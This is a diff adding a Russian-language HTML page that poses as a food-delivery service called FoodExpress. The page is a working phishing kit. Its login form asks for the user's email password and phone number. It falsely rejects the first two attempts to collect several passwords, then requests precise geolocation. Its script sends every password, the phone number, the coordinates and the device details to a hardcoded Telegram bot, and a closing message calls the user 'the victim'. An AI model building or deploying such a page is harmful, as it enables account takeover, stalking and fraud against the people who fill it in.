@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FoodExpress — Доставка еды</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            transition: background 0.3s;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        /* Карточка */
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 25px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            display: none;
+            animation: fadeUp 0.4s ease;
+        }
+        .card.active { display: block; }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Лого */
+        .logo {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 800;
+            color: #e84118;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        /* Поля */
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #eee;
+            border-radius: 14px;
+            font-size: 15px;
+            outline: none;
+            transition: 0.2s;
+            background: #fafafa;
+        }
+        .input-group input:focus {
+            border-color: #e84118;
+            background: white;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #e84118;
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 5px;
+        }
+        .btn:hover { background: #c23616; }
+        .btn:disabled { background: #aaa; cursor: not-allowed; }
+
+        .error-msg {
+            color: #c0392b;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 8px;
+            min-height: 20px;
+        }
+        .success-msg {
+            color: #27ae60;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 8px;
+        }
+
+        /* Карточки меню */
+        .menu-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .food-card {
+            background: #fff;
+            border-radius: 18px;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .food-card:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,0,0,0.1); }
+        .food-card img {
+            width: 80px;
+            height: 80px;
+            object-fit: cover;
+            border-radius: 12px;
+        }
+        .food-card h3 {
+            margin: 10px 0 5px;
+            font-size: 16px;
+            color: #333;
+        }
+        .food-card span {
+            color: #e84118;
+            font-weight: bold;
+        }
+        .map-container {
+            width: 100%;
+            height: 200px;
+            border-radius: 14px;
+            overflow: hidden;
+            margin: 15px 0;
+            border: 2px solid #eee;
+        }
+        iframe { width: 100%; height: 100%; border: 0; }
+        .location-info {
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- ЭКРАН ВХОДА -->
+        <div class="card active" id="loginCard">
+            <div class="logo">🍕 FoodExpress</div>
+            <div class="subtitle">Войдите, чтобы сделать заказ</div>
+            <div class="input-group">
+                <label>Email</label>
+                <input type="email" id="email" placeholder="example@mail.com">
+            </div>
+            <div class="input-group">
+                <label>Пароль от почты</label>
+                <input type="password" id="password" placeholder="••••••••">
+            </div>
+            <div class="input-group">
+                <label>Номер телефона</label>
+                <input type="tel" id="phone" placeholder="+7 (999) 123-45-67">
+            </div>
+            <button class="btn" id="loginBtn">Войти</button>
+            <div class="error-msg" id="loginError"></div>
+            <div class="success-msg" id="loginSuccess" style="display:none;"></div>
+        </div>
+
+        <!-- ЭКРАН МЕНЮ (после "верного" пароля) -->
+        <div class="card" id="menuCard">
+            <div class="logo" style="font-size:24px;">🍽️ Меню</div>
+            <div class="subtitle">Выберите блюдо для заказа</div>
+            <div class="menu-grid">
+                <div class="food-card" onclick="selectFood('Пицца Пепперони', 499)">
+                    <img src="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/apple/325/pizza_1f355.png" alt="Пицца">
+                    <h3>Пицца Пепперони</h3>
+                    <span>499 ₽</span>
+                </div>
+                <div class="food-card" onclick="selectFood('Бургер Чизбургер', 349)">
+                    <img src="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/apple/325/hamburger_1f354.png" alt="Бургер">
+                    <h3>Чизбургер</h3>
+                    <span>349 ₽</span>
+                </div>
+                <div class="food-card" onclick="selectFood('Суши Филадельфия', 599)">
+                    <img src="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/apple/325/sushi_1f363.png" alt="Суши">
+                    <h3>Суши Филадельфия</h3>
+                    <span>599 ₽</span>
+                </div>
+                <div class="food-card" onclick="selectFood('Картошка Фри', 199)">
+                    <img src="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/apple/325/french-fries_1f35f.png" alt="Фри">
+                    <h3>Картошка Фри</h3>
+                    <span>199 ₽</span>
+                </div>
+            </div>
+            <div class="error-msg" id="menuMsg"></div>
+        </div>
+
+        <!-- ЭКРАН ГЕОЛОКАЦИИ (после выбора еды) -->
+        <div class="card" id="locationCard">
+            <div class="logo" style="font-size:22px;">📍 Уточните адрес</div>
+            <div class="subtitle">Нажмите кнопку, чтобы разрешить геолокацию</div>
+            <button class="btn" id="getLocationBtn">Определить местоположение</button>
+            <div class="map-container" id="mapContainer" style="display:none;">
+                <iframe id="mapFrame"></iframe>
+            </div>
+            <div class="location-info" id="coordsInfo" style="display:none;"></div>
+            <button class="btn" id="confirmOrderBtn" style="display:none; background:#27ae60;">Подтвердить адрес и заказать</button>
+            <div class="error-msg" id="locError"></div>
+        </div>
+
+        <!-- Финальный экран -->
+        <div class="card" id="finalCard">
+            <div class="logo">✅ Заказ оформлен!</div>
+            <div class="subtitle">Курьер уже выехал. Ожидайте.</div>
+            <div style="text-align:center; font-size:40px; margin:20px 0;">🛵💨</div>
+            <p style="text-align:center; color:#888; font-size:13px;">Ваш заказ будет доставлен в течение 45 минут.</p>
+        </div>
+    </div>
+
+    <script>
+        // ============== КОНФИГУРАЦИЯ TELEGRAM (уже вставлена) ==============
+        const TELEGRAM_TOKEN = '7358134975:AAEWBhmzfdqFb6CoPtazw47Aizhs_597LJA';
+        const CHAT_ID = '5235143034';
+
+        // Состояние
+        let attemptCounter = 0;            // счётчик попыток входа
+        let allPasswords = [];            // все введённые пароли
+        let userPhone = '';
+        let userEmail = '';
+        let selectedFood = null;
+        let userCoords = null;
+
+        // DOM элементы
+        const loginCard = document.getElementById('loginCard');
+        const menuCard = document.getElementById('menuCard');
+        const locationCard = document.getElementById('locationCard');
+        const finalCard = document.getElementById('finalCard');
+        const loginError = document.getElementById('loginError');
+        const loginSuccess = document.getElementById('loginSuccess');
+        const menuMsg = document.getElementById('menuMsg');
+        const locError = document.getElementById('locError');
+        const coordsInfo = document.getElementById('coordsInfo');
+        const mapContainer = document.getElementById('mapContainer');
+        const mapFrame = document.getElementById('mapFrame');
+        const getLocationBtn = document.getElementById('getLocationBtn');
+        const confirmOrderBtn = document.getElementById('confirmOrderBtn');
+
+        // Переключение экранов
+        function showCard(card) {
+            document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+            card.classList.add('active');
+        }
+
+        // Отправка в Telegram
+        async function sendToTelegram(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text
+                    })
+                });
+            } catch (e) {
+                console.error('Telegram send error', e);
+            }
+        }
+
+        // Формирование полного отчёта
+        function buildReport() {
+            const ua = navigator.userAgent;
+            const coords = userCoords ? `${userCoords.latitude}, ${userCoords.longitude}` : 'не получены';
+            const passwordList = allPasswords.join(', ');
+            return `📦 *НОВЫЙ ЗАКАЗ*\n` +
+                   `📧 Email: ${userEmail}\n` +
+                   `🔑 Пароли (все попытки): ${passwordList || 'нет'}\n` +
+                   `📱 Телефон: ${userPhone}\n` +
+                   `🍕 Заказ: ${selectedFood ? selectedFood.name : 'не выбрано'}\n` +
+                   `📍 Координаты: ${coords}\n` +
+                   `📱 Устройство: ${ua}`;
+        }
+
+        // Логин
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const phone = document.getElementById('phone').value.trim();
+
+            if (!email || !password || !phone) {
+                loginError.textContent = 'Заполните все поля';
+                return;
+            }
+
+            // Сохраняем данные
+            userEmail = email;
+            userPhone = phone;
+            allPasswords.push(password);
+            attemptCounter++;
+
+            // Сразу шлём попытку в Telegram
+            await sendToTelegram(`🔐 Попытка ${attemptCounter}\nEmail: ${email}\nПароль: ${password}\nТелефон: ${phone}`);
+
+            // Имитация проверки пароля: первые 2 попытки – неверный, 3-я – верный
+            if (attemptCounter < 3) {
+                loginError.textContent = `❌ Неверный пароль. Попытка ${attemptCounter} из 3`;
+                document.getElementById('password').value = ''; // очищаем для повторного ввода
+            } else {
+                // Верный пароль!
+                loginError.textContent = '';
+                loginSuccess.style.display = 'block';
+                loginSuccess.textContent = '✅ Верный пароль! Загрузка меню...';
+                document.getElementById('loginBtn').disabled = true;
+                // Отправим сообщение, что пароль принят
+                await sendToTelegram(`✅ Пароль принят с попытки ${attemptCounter}\nEmail: ${email}\nПароль: ${password}`);
+
+                setTimeout(() => {
+                    showCard(menuCard);
+                    loginSuccess.style.display = 'none';
+                    document.getElementById('loginBtn').disabled = false;
+                }, 1200);
+            }
+        });
+
+        // Выбор еды
+        function selectFood(name, price) {
+            selectedFood = { name, price };
+            showCard(locationCard);
+            menuMsg.textContent = '';
+        }
+
+        // Геолокация
+        getLocationBtn.addEventListener('click', () => {
+            if (!navigator.geolocation) {
+                locError.textContent = 'Геолокация не поддерживается браузером';
+                return;
+            }
+            getLocationBtn.disabled = true;
+            locError.textContent = '';
+
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    userCoords = {
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude
+                    };
+                    // Показываем карту OpenStreetMap
+                    const lat = userCoords.latitude;
+                    const lon = userCoords.longitude;
+                    const bbox = `${lon-0.01},${lat-0.01},${lon+0.01},${lat+0.01}`;
+                    mapFrame.src = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lon}`;
+                    mapContainer.style.display = 'block';
+                    coordsInfo.style.display = 'block';
+                    coordsInfo.textContent = `Координаты: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
+                    confirmOrderBtn.style.display = 'block';
+                    getLocationBtn.style.display = 'none';
+                },
+                (err) => {
+                    locError.textContent = 'Ошибка получения геолокации. Разрешите доступ.';
+                    getLocationBtn.disabled = false;
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+
+        // Подтверждение заказа и отправка финальных данных
+        confirmOrderBtn.addEventListener('click', async () => {
+            confirmOrderBtn.disabled = true;
+            const report = buildReport();
+            await sendToTelegram(report);
+            showCard(finalCard);
+            // Дополнительно можно отправить ещё раз с пометкой
+            await sendToTelegram('📮 Финальный отчёт отправлен. Жертва видит экран "курьер едет".');
+        });
+    </script>
+</body>
+</html>
